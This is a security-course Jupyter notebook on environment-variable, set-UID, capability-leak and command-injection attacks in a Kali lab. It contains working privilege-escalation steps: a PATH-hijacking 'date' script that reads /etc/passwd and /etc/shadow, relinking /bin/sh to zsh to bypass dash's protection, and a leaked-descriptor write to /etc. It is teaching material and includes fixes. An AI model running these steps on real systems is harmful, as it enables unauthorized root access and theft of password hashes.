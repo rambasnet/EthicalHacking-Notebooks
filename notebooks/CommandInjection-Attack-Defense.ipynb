{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "995bab00-bff8-4ba8-bcd3-a94207726d31",
   "metadata": {},
   "source": [
    "# Command Injection Vulnerability, Attacks and Mitigations\n",
    "\n",
    "## Environment Variables Pitfalls\n",
    "- there's no known inherent vulnerability on environment variables\n",
    "- like many features of OSes, they just provide a convenient way to manage configuration settings\n",
    "\n",
    "### Security Risks\n",
    "- env vars are accessible by processes on the system; means that sensitive information stored in them such as API keys or database credentials could potentially be exposed if proper security measures not in place\n",
    "\n",
    "### Accidental Overwriting\n",
    "- since env vars are dynamic and can be changed at runtime, there's a risk of accidental overwriting\n",
    "- a misconfigured or malicious process might alter the values of critical variables, leading to unexpected behavior of applications\n",
    "\n",
    "### Debugging Challenges\n",
    "- in complex systems, tracing the source of a problem can be difficult\n",
    "\n",
    "### Dependency on External Configuration\n",
    "- overreliance on environment variables for configuration settings can make it challenging to manage and version configurations, esp. in larger projects\n",
    "- changes in configruations may require updates in multiple places, leading to potentital inconsistencies\n",
    "\n",
    "### Lack of Encryption\n",
    "- environment variables are typically stored in plaintext\n",
    "- sensitive information if stored as env vars can be exposed\n",
    "\n",
    "### Limited Access Control\n",
    "- access control on env variables are ususally limited\n",
    "- it can be challenging to ensure proper access control to preven unauthorized access and modification to sensitive variables\n",
    "\n",
    "### Hard-Coding Pitfall\n",
    "- care should be taken to access the hard-coded env vars in programs\n",
    "- what if the values of the variables are modified by the malicios programs and processes?\n",
    "\n",
    "## Environment Variables Exploitation Demo\n",
    "\n",
    "- `today.cpp` program in `demos/envexploit` folder uses `system` API to rely on PATH variable to call date function\n",
    "- can we force this program to read `/etc/passwd` file without modifying the program itself?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "202232d1-2a5e-4fdc-af3f-6cdee3934827",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SoftwareSecurity'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1dbeeb17-86ad-4c2a-8cf4-f4d061f01e3d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/envexploit\n"
     ]
    }
   ],
   "source": [
    "%cd ./demos/envexploit/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "487c8485-581f-4b17-8ea4-aff1feda5066",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/envexploit\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ad7b796d-cb35-4d43-8b2b-decb66cdab63",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 44\n",
      "drwxr-xr-x  2 kali kali  4096 Jan 18 14:14 .\n",
      "drwxr-xr-x 17 kali kali  4096 Jan 19 00:25 ..\n",
      "-rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile\n",
      "-rwxr-xr-x  1 kali kali   146 Jan 18 17:51 date\n",
      "-rwsr-sr-x  1 root kali 22632 Jan 18 13:57 today\n",
      "-rw-r--r--  1 kali kali   304 Jan 27 22:37 today.cpp\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "3b8d63fa-4c61-4d3f-a6ae-75b709fba7fe",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "// Wrapper program for bash date program\n",
      "\n",
      "#include <cstdio>\n",
      "#include <cstring>\n",
      "#include <cstdlib>\n",
      "\n",
      "using namespace std;\n",
      "\n",
      "int main(int argc, char* argv[]) {\n",
      "    printf(\"Today is: \");\n",
      "    // must flush stdout so system call's result is printed after\n",
      "    fflush(stdout); \n",
      "    system(\"date\");\n",
      "    return 0;\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat today.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "7f2c771e-8252-4cd9-a8fc-379370e8c84c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "COMPILER = g++\n",
      "\n",
      "COMPILER_FLAGS = -g -Wall -std=c++17\n",
      "\n",
      "# the build target executable program name of your choice\n",
      "PROGRAM_NAME = today\n",
      "\n",
      "CPP_FILES = today.cpp\n",
      "\n",
      "build:\n",
      "\t$(COMPILER) $(COMPILER_FLAGS) $(CPP_FILES) -o $(PROGRAM_NAME)\n",
      "\n",
      "# make clean rule\n",
      "# delete object and binary files\n",
      "clean:\n",
      "\trm -f $(PROGRAM_NAME) *.o\n"
     ]
    }
   ],
   "source": [
    "! cat  Makefile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "139a881e-ef2c-40f0-80c6-44cd1f24c37e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "g++ -g -Wall -std=c++17 today.cpp -o today\n"
     ]
    }
   ],
   "source": [
    "! make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "91f679fa-99ed-4c36-a421-f12f34ad798d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 44\n",
      "drwxr-xr-x  2 kali kali  4096 Jan 28 16:00 .\n",
      "drwxr-xr-x 17 kali kali  4096 Jan 19 00:25 ..\n",
      "-rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile\n",
      "-rwxr-xr-x  1 kali kali   146 Jan 18 17:51 date\n",
      "-rwxr-xr-x  1 kali kali 22632 Jan 28 16:00 today\n",
      "-rw-r--r--  1 kali kali   304 Jan 27 22:37 today.cpp\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "64be312c-f41a-4908-adb0-d2a3c3990e7c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Today is: Sun Jan 28 16:00:38 EST 2024\n"
     ]
    }
   ],
   "source": [
    "! ./today"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "15de8c03-9281-4b8f-9c06-e8df99c0e749",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/usr/bin/date\n"
     ]
    }
   ],
   "source": [
    "! which date"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2811542c-ec28-487b-aaaa-7214cb2ef59a",
   "metadata": {},
   "source": [
    "## Exploitation of PATH env variable\n",
    "\n",
    "- today program uses `system` API to call `date` program\n",
    "- system finds `date` program by search the `PATH` variable which is in `/usr/bin/date`\n",
    "- create your own \"date\" program; that does whatever you want it to do\n",
    "- update the PATH so it finds your \"date\" program before finding system's `/usr/bin/date`\n",
    "- you can write your program in whatever language of your choice\n",
    "    - bash script is the easiest in this case\n",
    "- see `date` script in the `demo/envexploit` folder\n",
    "- make the program executable\n",
    "- update the PATH from Terminal and run the today program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "45c20787-aa9a-4226-9f3c-b2471438775b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#! /bin/sh\n",
      "\n",
      "# date program that reads /etc/passwd file\n",
      "\n",
      "if cat /etc/passwd; then\n",
      "    echo \"Woohoo I got it!\"\n",
      "else\n",
      "    echo \"Command failed :(\"\n",
      "fi\n"
     ]
    }
   ],
   "source": [
    "! cat date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "ce7d4032-42c8-4058-b257-c8df653ed90c",
   "metadata": {},
   "outputs": [],
   "source": [
    "! chmod +x date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "17bd8bab-2194-4bd9-bdc3-5b2190e5fe59",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxr-xr-x 1 kali kali 146 Jan 18 17:51 date\n"
     ]
    }
   ],
   "source": [
    "! ls -al date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "ba1d180d-4506-4281-9503-44de1726c777",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "root:x:0:0:root:/root:/usr/bin/zsh\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
      "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n",
      "_galera:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
      "mysql:x:101:106:MySQL Server,,,:/nonexistent:/bin/false\n",
      "tss:x:102:107:TPM software stack,,,:/var/lib/tpm:/bin/false\n",
      "strongswan:x:103:65534::/var/lib/strongswan:/usr/sbin/nologin\n",
      "systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin\n",
      "redsocks:x:104:108::/var/run/redsocks:/usr/sbin/nologin\n",
      "rwhod:x:105:65534::/var/spool/rwho:/usr/sbin/nologin\n",
      "_gophish:x:106:110::/var/lib/gophish:/usr/sbin/nologin\n",
      "iodine:x:107:65534::/run/iodine:/usr/sbin/nologin\n",
      "messagebus:x:108:111::/nonexistent:/usr/sbin/nologin\n",
      "miredo:x:109:65534::/var/run/miredo:/usr/sbin/nologin\n",
      "redis:x:110:114::/var/lib/redis:/usr/sbin/nologin\n",
      "usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
      "mosquitto:x:112:116::/var/lib/mosquitto:/usr/sbin/nologin\n",
      "tcpdump:x:113:118::/nonexistent:/usr/sbin/nologin\n",
      "sshd:x:114:65534::/run/sshd:/usr/sbin/nologin\n",
      "_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin\n",
      "dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n",
      "statd:x:117:65534::/var/lib/nfs:/usr/sbin/nologin\n",
      "avahi:x:118:122:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin\n",
      "stunnel4:x:995:995:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin\n",
      "Debian-snmp:x:119:123::/var/lib/snmp:/bin/false\n",
      "_gvm:x:120:124::/var/lib/openvas:/usr/sbin/nologin\n",
      "speech-dispatcher:x:121:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false\n",
      "sslh:x:122:125::/nonexistent:/usr/sbin/nologin\n",
      "postgres:x:123:126:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n",
      "pulse:x:124:128:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin\n",
      "inetsim:x:125:130::/var/lib/inetsim:/usr/sbin/nologin\n",
      "lightdm:x:126:131:Light Display Manager:/var/lib/lightdm:/bin/false\n",
      "geoclue:x:127:132::/var/lib/geoclue:/usr/sbin/nologin\n",
      "saned:x:128:134::/var/lib/saned:/usr/sbin/nologin\n",
      "polkitd:x:993:993:polkit:/nonexistent:/usr/sbin/nologin\n",
      "rtkit:x:129:135:RealtimeKit,,,:/proc:/usr/sbin/nologin\n",
      "colord:x:130:136:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n",
      "nm-openvpn:x:131:137:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\n",
      "nm-openconnect:x:132:138:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin\n",
      "kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh\n",
      "user:x:1003:1003:User user,123,232,:/home/user:/bin/bash\n",
      "Woohoo I got it!\n"
     ]
    }
   ],
   "source": [
    "! ./date"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf02eb7b-33f5-4b30-ba6e-6fe36a5864b0",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ export PATH=$PWD:$PATH \n",
    "                                                                                                     \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ echo $PATH            \n",
    "/home/kali/projects/SoftwareSecurity/demos/envexploit:/home/kali:/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali//home/kali/bin\n",
    "\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ ./today\n",
    "Today is: root:x:0:0:root:/root:/usr/bin/zsh\n",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    "...\n",
    "\n",
    "kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh\n",
    "bob:x:1001:1001:,,,:/home/bob:/bin/bash\n",
    "Woohoo I got it!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0d614b6-0e2d-457f-9b98-14a4c1903506",
   "metadata": {},
   "source": [
    "## Attack Surfaces on Set-UID Programs\n",
    "\n",
    "- the impact of exploitation of set-uid programs can be severe\n",
    "- can compromise all 3 CIA triads\n",
    "    - what are CIA triads?\n",
    "\n",
    "![Attack Surfaces](./media/setuid-attacks.png)\n",
    "\n",
    "### Attacks Via User Inputs\n",
    "\n",
    "#### Buffer Overflow\n",
    "- covered in depth later in Bufffer Overflow chapters\n",
    "- overflow a buffer to run arbitrary malicious code\n",
    "\n",
    "#### Format String Vulnerability\n",
    "- covered in dpeth later in Format String chapter\n",
    "- change program behavior using user inputs for format strings\n",
    "\n",
    "### Attacks via System Inputs\n",
    "- covered in Race Condition chapter\n",
    "\n",
    "### Attacks via Environment Variables\n",
    "- if the program (e.g., today program) is set-uid, you can exploit it to execute any program as the owner of the program\n",
    "- if the program is root, anyone who can run this program gains root's privileges during its execution\n",
    "    - esentially, it typically escalates users' privileges and that can have serious consequences\n",
    "- `system(command)` is a wrapper for `/bin/sh`\n",
    "    - it is invoked as `/bin/sh -c command`\n",
    "    - i.e., it invokes `/bin/sh` and and asks the shell to execute the command\n",
    "- `system()` passes the env vars of calling process to the new program `/bin/sh`\n",
    "- in newer version of Linux (Ubuntu 20.04 and Kali 2023, e.g.), `/bin/sh` is actually a symbolic link pointing to `/bin/dash`\n",
    "- `/bin/dash` has a conutermeasure that prevents itself from being executed in a Set-UID process\n",
    "    - if dash detects that it is being executed in a Set-UID prorcess, it immediately changes the effective User ID to the process's real ID -- essentially dropping the privilege\n",
    "- if we update the `date` script and try to read priviledged `/etc/shadow` file, it'll fail!\n",
    "- we can however update the softlink  `/bin/sh` to point to `/bin/zsh` which doesn't have the countermeasure"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "9fabf506-5c8d-4c10-8a9b-ad966e0940f3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lrwxrwxrwx 1 root root 4 Jun 21  2023 /bin/sh -> dash\n"
     ]
    }
   ],
   "source": [
    "! ls -al /bin/sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "f3295ac9-6ea5-476f-bb13-142bfe39b0dc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S chown root today"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "a4fca951-29d2-456c-904f-c6de41f7c080",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 44\n",
      "drwxr-xr-x  2 kali kali  4096 Jan 18 14:14 .\n",
      "drwxr-xr-x 15 kali kali  4096 Jan 18 13:56 ..\n",
      "-rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile\n",
      "-rwxr-xr-x  1 kali kali    97 Jan 18 14:10 date\n",
      "-rwxr-xr-x  1 root kali 22632 Jan 18 13:57 today\n",
      "-rw-r--r--  1 kali kali   304 Jan 18 13:51 today.cpp\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "aa17b7db-638a-4cc9-97b8-1822173caca6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S chmod +s today"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "b0057334-b3c1-4eb7-84de-d8191c5d67da",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 44\n",
      "drwxr-xr-x  2 kali kali  4096 Jan 18 14:14 .\n",
      "drwxr-xr-x 15 kali kali  4096 Jan 18 13:56 ..\n",
      "-rw-r--r--  1 kali kali   313 Jan 18 13:48 Makefile\n",
      "-rwxr-xr-x  1 kali kali    97 Jan 18 14:10 date\n",
      "-rwsr-sr-x  1 root kali 22632 Jan 18 13:57 today\n",
      "-rw-r--r--  1 kali kali   304 Jan 18 13:51 today.cpp\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "16561ec7-e334-482a-a9a8-691730a0fe99",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#! /bin/sh\n",
      "\n",
      "# date program that reads /etc/passwd file\n",
      "\n",
      "if cat /etc/shadow; then\n",
      "    echo \"Woohoo I got it!\"\n",
      "else\n",
      "    echo \"Command failed :(\"\n",
      "fi\n"
     ]
    }
   ],
   "source": [
    "! cat date "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "188023ef-6191-4660-a19f-856b4ab9c311",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ ./today\n",
    "Today is: cat: /etc/shadow: Permission denied\n",
    "Command failed :(\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "da7232ac-a10b-456e-bef9-7bdafee44ee8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's create a soft link /bin/sh pointing to /bin/zsh\n",
    "! echo kali | sudo -S ln -sf /bin/zsh /bin/sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "7947b920-6483-4292-9705-966a4df3373f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lrwxrwxrwx 1 root root 8 Jan 18 17:46 /bin/sh -> /bin/zsh\n"
     ]
    }
   ],
   "source": [
    "! ls -al /bin/sh"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52896938-0a94-426d-b398-f326d91aa8fe",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ ./today\n",
    "Today is: root:!:19662:0:99999:7:::\n",
    "...\n",
    "kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::\n",
    "bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7:::\n",
    "Woohoo I got it!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "005255af-0f50-40db-a810-bcadc46f8d9c",
   "metadata": {},
   "source": [
    "## Capability Leaking\n",
    "\n",
    "- in some cases, privileged programs downgrade themselves during execution\n",
    "- E.g., **su** program\n",
    "\n",
    "### su\n",
    "- su is a privileged set-uid program\n",
    "- allows user to switch to another user (say user1 to user2)\n",
    "- program starts with EUID as root and RUID as user1\n",
    "- after password verification, both EUID and RUID becomes user2's (via privilege downgrading)\n",
    "- such programs may lead to capability leaking if not implemented correctly\n",
    "    - programs may not clean up privileged capabilities before downgrading\n",
    "\n",
    "### Attacks via Capability Leaking\n",
    "- let's look at an example program provided in `demos/capleak/` folder\n",
    "- program opens a file in `/etc` in **write/append** mode\n",
    "- program must be root setuid to be able to write to the `/etc` folder\n",
    "- program downgrades the privilege with the RUID of the user\n",
    "- it then executes `/bin/sh`\n",
    "- conviniently, file descriptor value is also printed\n",
    "- run the program from the Terminal to get the shell "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "081ad135-cd23-4f9d-b20f-56e728d59bf2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/envexploit\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "eb868cde-b8e4-4059-b43b-88d9edf32285",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/capleak\n"
     ]
    }
   ],
   "source": [
    "%cd ../capleak"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "f250afc5-5757-406c-bcad-15ef319f13db",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 16\n",
      "drwxr-xr-x  2 kali kali 4096 Jan 18 22:32 .\n",
      "drwxr-xr-x 16 kali kali 4096 Jan 18 18:00 ..\n",
      "-rw-r--r--  1 kali kali  394 Jan 18 22:10 Makefile\n",
      "-rw-r--r--  1 kali kali  721 Jan 18 22:13 capleak.cpp\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "a071aba4-ca28-4d0e-84ac-b88acc09781e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "// https://github.com/seed-labs/seed-labs/blob/master/category-software/Environment_Variable_and_SetUID/Labsetup/cap_leak.c\n",
      "#include <unistd.h>\n",
      "#include <stdio.h>\n",
      "#include <stdlib.h>\n",
      "#include <fcntl.h>\n",
      "\n",
      "using namespace std;\n",
      "\n",
      "int main(int argc, char* argv[]) {\n",
      "    int fd;\n",
      "    char *v[2];\n",
      "    \n",
      "    fd = open(\"/etc/xyz\", O_RDWR | O_APPEND | O_CREAT); \n",
      "    if (fd == -1) {\n",
      "        printf(\"Failed to open /etc/xyz\\n\");\n",
      "        exit(1);\n",
      "    }\n",
      "    // print out the file descriptor value\n",
      "    printf(\"fd is %d\\n\", fd);\n",
      "    // FIXME - close the file\n",
      "    // close(fd);\n",
      "    // downgrade the privilege my making the effective uid the same as the real uid\n",
      "    setuid(getuid());\n",
      "    // execute /bin/sh\n",
      "    v[0] = \"/bin/sh\"; v[1] = 0;\n",
      "    execve(v[0], v, 0);\n",
      "    return 0;\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "! cat capleak.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "5cd4a834-d511-4820-800e-c45d71b70442",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: g++ -g -Wall -std=c++17 capleak.cpp -o capleak\n",
      "\u001b[01m\u001b[Kcapleak.cpp:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kint\u001b[01;32m\u001b[K main\u001b[m\u001b[K(int, char**)\u001b[m\u001b[K’:\n",
      "\u001b[01m\u001b[Kcapleak.cpp:24:12:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[KISO C++ forbids converting a string constant to ‘\u001b[01m\u001b[Kchar*\u001b[m\u001b[K’ [\u001b[01;35m\u001b[K\u001b]8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wwrite-strings\u0007-Wwrite-strings\u001b]8;;\u0007\u001b[m\u001b[K]\n",
      "   24 |     v[0] = \u001b[01;35m\u001b[K\"/bin/sh\"\u001b[m\u001b[K; v[1] = 0;\n",
      "      |            \u001b[01;35m\u001b[K^~~~~~~~~\u001b[m\u001b[K\n",
      "sudo chown root capleak\n",
      "sudo chmod +s capleak\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "b7c2b332-3d6e-4625-b1fa-5f58614da7af",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 48\n",
      "drwxr-xr-x  2 kali kali  4096 Jan 18 22:33 .\n",
      "drwxr-xr-x 16 kali kali  4096 Jan 18 18:00 ..\n",
      "-rw-r--r--  1 kali kali   394 Jan 18 22:10 Makefile\n",
      "-rwsr-sr-x  1 root root 30384 Jan 18 22:33 capleak\n",
      "-rw-r--r--  1 kali kali   721 Jan 18 22:13 capleak.cpp\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "39802b4e-3e17-4e85-b9c4-b584d5ffb198",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/capleak]\n",
    "└─$ ./capleak \n",
    "fout is 3\n",
    "$ echo ABCDEF                                                                                              \n",
    "ABCDEF\n",
    "$ echo ABCDEF >& 3                                                                                       \n",
    "$ cat /etc/xyz                                                                                             \n",
    "aaa\n",
    "aaaa\n",
    "ABCDEF\n",
    "$ exit\n",
    "```\n",
    "\n",
    "## Fix the Vulnerability\n",
    "\n",
    "- close/destroy the file description before dropping the privelege\n",
    "\n",
    "## Capbility Leaking in OS X - Case Study\n",
    "\n",
    "- OS X Yosemite found vulnerable to privilege escalation attack related to capability leaking in July 2015 ( OS X 10.10 )\n",
    "- added features to dynamic linker dyld \n",
    "    - DYLD_PRINT_TO_FILE environment variable\n",
    "- the dynamic linker can open any file, so for root-owned Set-UID programs, it runs with root privileges \n",
    "- the dynamic linker dyld, does not close the file leading to capability leaking vulnerability\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "15394750-7b66-492e-9d1c-06b16cc53ad9",
   "metadata": {},
   "source": [
    "## Command Injection\n",
    "\n",
    "- programs' often takes input from users\n",
    "- if the users' input is not validated and sanitized, data can be converted into command name\n",
    "    - data is then executed as command\n",
    "- SQL injection is a type of command injection attack very common in SQL-driven web applications\n",
    "- see `catall.cpp` file in `demos/injection` folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "8cdb4adc-fd11-4f18-8ebf-7c08d07d12e4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/capleak\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "5f767aba-4624-409a-ade3-1cf3098e7391",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/injection\n"
     ]
    }
   ],
   "source": [
    "%cd ../injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "68e08a6c-e103-4c05-9af7-6bbcfbf7e2a2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 12\n",
      "drwxr-xr-x  2 kali kali 4096 Jan 19 00:25 .\n",
      "drwxr-xr-x 17 kali kali 4096 Jan 19 00:25 ..\n",
      "-rw-r--r--  1 kali kali  393 Jan 19 00:27 Makefile\n",
      "-rw-r--r--  1 kali kali    0 Jan 19 00:24 catall.c\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "be6af880-6128-4fe3-9cc3-cd221f9b112c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <unistd.h>\n",
      "#include <stdio.h>\n",
      "#include <stdlib.h>\n",
      "#include <string.h>\n",
